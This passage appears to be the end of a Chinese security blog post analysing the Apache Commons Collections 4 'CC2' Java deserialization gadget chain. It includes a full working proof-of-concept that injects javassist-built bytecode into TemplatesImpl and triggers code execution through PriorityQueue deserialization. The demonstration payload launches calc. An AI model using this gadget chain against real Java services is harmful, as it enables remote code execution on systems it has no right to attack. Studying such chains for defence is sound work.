+<p><a href="https://imgtu.com/i/Rj9H0g"><img src="https://z3.ax1x.com/2021/07/09/Rj9H0g.png" srcset="/img/loading.gif" lazyload alt="Rj9H0g.png"></a></p>
+<h2 id="执行代码"><a href="#执行代码" class="headerlink" title="执行代码"></a>执行代码</h2><p>上面这种方法仅仅能执行命令，危害不足。cc2中可以通过利用javasist 和 TemplatesImpl，加载字节码来进行执行代码。</p>
+<p>思路：</p>
+<ol>
+<li>先利用javasist生成字节码</li>
+<li>利用上面的<code>InvokerTransformer</code>触发<code>TemplatesImpl</code>的<code>newTransformer</code> 从而读取恶意字节码从而进行执行命令</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommonCollection2</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-comment">//利用javassist生成字节码</span><br>        ClassPool pool = ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass cc = pool.makeClass(<span class="hljs-string">&quot;Cat&quot;</span>);<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        cc.makeClassInitializer().insertBefore(cmd);<br>        String randomClassName = <span class="hljs-string">&quot;EvilCat&quot;</span> + System.nanoTime();<br>        cc.setName(randomClassName);<br>        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br><br>        <span class="hljs-keyword">byte</span>[] classBytes = cc.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;classBytes&#125;;<br><br>        <span class="hljs-comment">//构造InvokerTransformer触发TemplatesImpl的newTransformer</span><br>        Constructor constructor = Class.forName(<span class="hljs-string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>)<br>            .getDeclaredConstructor(String.class);<br>        constructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(<span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        <br><br>        <span class="hljs-comment">//设置TemplatesImpl的三个属性</span><br>        TemplatesImpl templates = TemplatesImpl.class.newInstance();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetByteCodes);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);<br><br>        <span class="hljs-comment">//设置PriorityQueue的queue属性</span><br>        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">1</span>);<br>        Object[] queue_array = <span class="hljs-keyword">new</span> Object[]&#123;templates,<span class="hljs-number">1</span>&#125;;<br>        Field queue_field = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;queue&quot;</span>);<br>        queue_field.setAccessible(<span class="hljs-keyword">true</span>);<br>        queue_field.set(queue,queue_array);<br><br>        <span class="hljs-comment">//设置PriorityQueue的size属性</span><br>        Field size = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;size&quot;</span>);<br>        size.setAccessible(<span class="hljs-keyword">true</span>);<br>        size.set(queue,<span class="hljs-number">2</span>);<br><br>        <span class="hljs-comment">//利用反射给PriorityQueue的comparator属性赋值为 TransformingComparator，触发TransformingComparator.compare()，执行代码</span><br>        TransformingComparator comparator = <span class="hljs-keyword">new</span> TransformingComparator(transformer);<br>        Field comparator_field = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        comparator_field.setAccessible(<span class="hljs-keyword">true</span>);<br>        comparator_field.set(queue,comparator);<br><br>        <span class="hljs-comment">//模拟反序列化</span><br>        <span class="hljs-keyword">try</span>&#123;<br>            ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;./cc2&quot;</span>));<br>            outputStream.writeObject(queue);<br>            outputStream.close();<br><br>            ObjectInputStream inputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;./cc2&quot;</span>));<br>            inputStream.readObject();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-keyword">final</span> Field field = getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> </span>&#123;<br>        Field field = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-keyword">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-keyword">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+
+
+<p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#compare</code></p>
+<p>调用设置好的InvokerTransformer的transform，反射调用newTransformer</p>
+<p><a href="https://imgtu.com/i/Rj9Xhn"><img src="https://z3.ax1x.com/2021/07/09/Rj9Xhn.png" srcset="/img/loading.gif" lazyload alt="Rj9Xhn.png"></a></p>
+<p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer</code></p>
+<p>进入getTransletInstance</p>
+<p><a href="https://imgtu.com/i/Rj9vpq"><img src="https://z3.ax1x.com/2021/07/09/Rj9vpq.png" srcset="/img/loading.gif" lazyload alt="Rj9vpq.png"></a></p>
+<p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getTransletInstance</code></p>
+<p>先用defineTransletClasses加载字节码，把得到的类赋值给<code>_class</code>，然后执行newInstance，把<code>_class</code>实例化</p>
+<p><a href="https://imgtu.com/i/RjC9nU"><img src="https://z3.ax1x.com/2021/07/09/RjC9nU.png" srcset="/img/loading.gif" lazyload alt="RjC9nU.png"></a></p>
+<p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#defineTransletClasses</code></p>
+<p>加载_bytecodes中的字节码</p>
+<p><a href="https://imgtu.com/i/RjCSXT"><img src="https://z3.ax1x.com/2021/07/09/RjCSXT.png" srcset="/img/loading.gif" lazyload alt="RjCSXT.png"></a></p>
+<p><a href="https://imgtu.com/i/RjCCBF"><img src="https://z3.ax1x.com/2021/07/09/RjCCBF.png" srcset="/img/loading.gif" lazyload alt="RjCCBF.png"></a></p>
+<p>成功执行</p>
+<p><a href="https://imgtu.com/i/Rj9zcV"><img src="https://z3.ax1x.com/2021/07/09/Rj9zcV.png" srcset="/img/loading.gif" lazyload alt="Rj9zcV.png"></a></p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="http://wjlshare.com/archives/1509">http://wjlshare.com/archives/1509</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/07/01/2021-GKCTF%E9%A2%98%E7%9B%AEwp%E4%B8%8E%E5%A4%8D%E7%8E%B0/">
+                        <span class="hidden-mobile">2021 GKCTF题目wp与复现</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
